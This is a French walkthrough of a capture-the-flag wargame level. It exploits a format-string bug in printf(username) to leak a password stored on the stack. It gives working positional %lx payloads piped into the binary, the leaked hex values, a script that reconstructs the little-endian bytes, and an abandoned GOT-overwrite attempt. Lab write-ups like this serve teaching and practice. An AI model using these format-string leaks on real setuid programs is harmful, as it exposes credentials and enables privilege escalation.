# Walkthrough – level02 (Format String → Leak du mot de passe)

## 🎯 Objectif

Exploiter une **vulnérabilité de format string** (`printf(username)`) afin de **leaker le mot de passe** stocké en mémoire (`real_pass`), puis s’authentifier en tant que `level03`.

---

## ✅ Méthode fonctionnelle (celle qui marche)

### 1️⃣ Identification de la vulnérabilité

Le code contient :

```c
printf(username); // format string vulnerability
```

Cela permet de lire arbitrairement la stack via des spécificateurs de format (`%lx`, `%n$lx`, etc.).

---

### 2️⃣ Vérification de l’accès à la mémoire

Test simple pour confirmer l’accès à la stack :

```bash
python -c 'print("%08lx | " * 20)' | ./level02
```

Sortie (extrait) :

```text
7fffffffe3e0 | 00000000 | 0000006c | 2a2a2a2a2a2a2a2a | ...
```

👉 La mémoire est bien lisible via la format string.

---

### 3️⃣ Ciblage de `real_pass`

D’après le code :
```c
char real_pass[41];
```

- Taille ≈ **40 octets**
- Soit **5 blocs de 8 octets**
- Contenu ASCII attendu
- Stocké sur la **stack**
- Rempli **avant** le `printf(username)`

---

### 4️⃣ Cartographie de la stack via accès positionnel

Dump progressif des arguments variadiques :

#### Arguments 1 → 10
```bash
python -c 'print("%1$lx | %2$lx | %3$lx | %4$lx | %5$lx | %6$lx | %7$lx | %8$lx | %9$lx | %10$lx")' | ./level02
```

#### Arguments 11 → 20
```bash
python -c 'print("%11$lx | %12$lx | %13$lx | %14$lx | %15$lx | %16$lx | %17$lx | %18$lx | %19$lx | %20$lx")' | ./level02
```

#### Arguments 21 → 30
```bash
python -c 'print("%21$lx | %22$lx | %23$lx | %24$lx | %25$lx | %26$lx | %27$lx | %28$lx | %29$lx | %30$lx")' | ./level02
```

Résultat notable :

```text
%22$lx → %26$lx
756e505234376848
45414a3561733951
377a7143574e6758
354a35686e475873
48336750664b394d
```

👉 5 blocs consécutifs, cohérents avec de l’ASCII → **candidat très probable pour `real_pass`**

---

### 5️⃣ Reconstruction du mot de passe (endianness)

Les valeurs sont :
- affichées par mots de 8 octets (`%lx`)
- en **little-endian**

#### Extraction brute
```bash
python -c 'print("%22$lx%23$lx%24$lx%25$lx%26$lx")' | ./level02
```

#### Reconstruction correcte (par blocs)

```bash
echo HEXSTRING |
fold -w16 |
while read block; do
  echo "$block" | xxd -r -p | rev
done
```

👉 Chaque bloc de 8 octets est inversé indépendamment, puis concaténé dans l’ordre.

---

### 6️⃣ Authentification

```bash
su level03
Password: <mot_de_passe>
```

Succès ✔️

---

## 🧪 Méthodes alternatives / expérimentations (non retenues)

### 🔸 Tentative via GOT overwrite (`exit@GOT`)

Objectif initial :
- détourner `exit()` vers `system()`
- via `%n` et écriture dans la GOT

Étapes explorées :
- repérage de l’index `%28$`
- identification de `exit@GOT` via `objdump -R`
- construction de payload `%n`

👉 Abandonné car :
- écriture 64-bit complexe (`%hn`, `%hhn`)
- calling convention x86_64 (arguments en registres)
- solution **plus fragile** que le leak direct

---

### 🔸 Debug sous GDB

Tentative de breakpoint après `fread()` :

```gdb
b *0x400906
run
```

Résultat :

```text
ERROR: failed to open password file
```

👉 Comportement normal :
- binaire **setuid**
- GDB désactive les privilèges
- `.pass` inaccessible en debug

---

## 🧠 Conclusion

- La vulnérabilité est bien une **format string**
- Deux stratégies possibles :
  - GOT overwrite (complexe en 64-bit)
  - **Leak direct du mot de passe (retenue)**
- La reconstruction nécessite :
  - accès positionnel (`%n$lx`)
  - gestion du **little-endian par blocs**
- Solution robuste, reproductible, et élégante
